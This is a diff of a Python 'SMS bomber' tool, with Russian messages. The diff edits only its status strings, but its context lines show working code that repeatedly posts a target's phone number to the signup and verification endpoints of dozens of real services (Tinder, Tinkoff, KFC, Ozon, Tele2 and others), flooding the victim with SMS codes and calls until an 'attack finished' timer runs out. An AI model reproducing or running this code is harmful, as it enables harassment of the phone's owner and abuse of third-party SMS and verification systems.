@@ -198,7 +198,7 @@ if call == str(1):
     while True:      	
       if time.time() > start_time + float(CLOSE_AFTER): 
         print(Fore.RED)
-        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        print("Атака закончена! Нажмите на ENTER для закрытия программы...")
         break
       try:
         requests.post('https://my.zadarma.com/connect/', params={"?number=": '+' + _phone})
@@ -210,7 +210,7 @@ if call == str(1):
 
       if time.time() > start_time + float(CLOSE_AFTER):
         print(Fore.RED)
-        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        print("Атака закончена! Нажмите на ENTER для закрытия программы...")
         break
       try:
         requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
@@ -223,7 +223,7 @@ if call == str(1):
 
       if time.time() > start_time + float(CLOSE_AFTER):
         print(Fore.RED)
-        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        print("Атака закончена! Нажмите на ENTER для закрытия программы...")
         break
 
       try:
@@ -251,7 +251,7 @@ if call == str(2):
     while True:
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -260,10 +260,10 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
@@ -272,7 +272,7 @@ if call == str(2):
             time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -280,10 +280,10 @@ if call == str(2):
             print('[+] RuTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправлено !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
@@ -291,10 +291,10 @@ if call == str(2):
             print('[+] BelkaCar отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправленo !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://starpizzacafe.com/mods/a.function.php',
@@ -303,10 +303,10 @@ if call == str(2):
             print('[+] StarPizzaCafe отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -315,10 +315,10 @@ if call == str(2):
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
@@ -326,10 +326,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -338,10 +338,10 @@ if call == str(2):
             print('[+] Tinkoff отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -350,10 +350,10 @@ if call == str(2):
             print('[+] Dostavista отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -363,10 +363,10 @@ if call == str(2):
             print('[+] MonoBank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -375,10 +375,10 @@ if call == str(2):
             print('[+] binotel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
@@ -387,10 +387,10 @@ if call == str(2):
             print('[+] SportMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -399,10 +399,10 @@ if call == str(2):
             print('[+] Alfalife отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
@@ -410,10 +410,10 @@ if call == str(2):
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://silpo.ua/graphql', data={
@@ -423,10 +423,10 @@ if call == str(2):
             print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })
@@ -434,10 +434,10 @@ if call == str(2):
             print('[+] BTfair отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ggbet.ru/api/auth/register-with-phone',
@@ -447,10 +447,10 @@ if call == str(2):
             print('[+] GGbet отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-]  не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.etm.ru/cat/runprog.html',
@@ -460,10 +460,10 @@ if call == str(2):
             print('[+] ETM отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -472,10 +472,10 @@ if call == str(2):
             print('[+] TheLive отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
@@ -483,10 +483,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
@@ -497,7 +497,7 @@ if call == str(2):
             print('[+] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://zoloto585.ru/api/bcard/reg/',
@@ -508,10 +508,10 @@ if call == str(2):
             print('[+] Zoloto585 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
@@ -519,10 +519,10 @@ if call == str(2):
             print('[+] Kasta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Kasta Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
@@ -531,10 +531,10 @@ if call == str(2):
             print('[+] Тaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -544,10 +544,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.creditter.ru/confirm/sms/send',
@@ -556,10 +556,10 @@ if call == str(2):
             print('[+] Creditter отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
@@ -572,10 +572,10 @@ if call == str(2):
             print('[+] Ingos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://win.1admiralxxx.ru/api/en/register.json',
@@ -585,10 +585,10 @@ if call == str(2):
             print('[+] Admiralxxx отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
@@ -596,10 +596,10 @@ if call == str(2):
             print('[+] Av отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -608,10 +608,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
@@ -619,10 +619,10 @@ if call == str(2):
             print('[+] City24 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
@@ -630,10 +630,10 @@ if call == str(2):
             print('[+] SushiMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
@@ -641,10 +641,10 @@ if call == str(2):
             print('[+] MultiPlex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
@@ -652,10 +652,10 @@ if call == str(2):
             print('[+] 3040 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.niyama.ru/ajax/sendSMS.php',
@@ -664,10 +664,10 @@ if call == str(2):
             print('[+] Niyama отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Niyama не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
@@ -675,10 +675,10 @@ if call == str(2):
             print('[+] VSK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] VSK не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
@@ -686,10 +686,10 @@ if call == str(2):
             print('[+] EasyPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://fix-price.ru/ajax/register_phone_code.php',
@@ -698,10 +698,10 @@ if call == str(2):
             print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
@@ -711,10 +711,10 @@ if call == str(2):
             print('[+] NovaLinia отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
@@ -722,10 +722,10 @@ if call == str(2):
             print('[+] Tele2 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
@@ -733,10 +733,10 @@ if call == str(2):
             print('[+] Finam отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://makimaki.ru/system/callback.php',
@@ -745,10 +745,10 @@ if call == str(2):
             print('[+] MakiMaki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.flipkart.com/api/6/user/signup/status',
@@ -759,10 +759,10 @@ if call == str(2):
             print('[+] FlipKart отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
@@ -770,10 +770,10 @@ if call == str(2):
             print('[+] Online.ua отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
@@ -781,10 +781,10 @@ if call == str(2):
             print('[+] PlanetaKino отправлено!')
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ontaxi.com.ua/api/v2/web/client',
@@ -793,10 +793,10 @@ if call == str(2):
             print('[+] OnTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -804,10 +804,10 @@ if call == str(2):
             print('[+] Iqos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://smart.space/api/users/request_confirmation_code/',
@@ -816,10 +816,10 @@ if call == str(2):
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
@@ -827,10 +827,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
@@ -840,10 +840,10 @@ if call == str(2):
             print('[+] tarantino-family отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://apteka.ru/_action/auth/getForm/',
@@ -856,10 +856,10 @@ if call == str(2):
             print('[+] Apteka отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://uklon.com.ua/api/v1/account/code/send',
@@ -868,10 +868,10 @@ if call == str(2):
             print('[+] Uklon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
@@ -880,10 +880,10 @@ if call == str(2):
             print('[+] Ozon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -893,10 +893,10 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
@@ -904,10 +904,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -916,10 +916,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -927,10 +927,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -939,10 +939,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -952,10 +952,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -964,10 +964,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
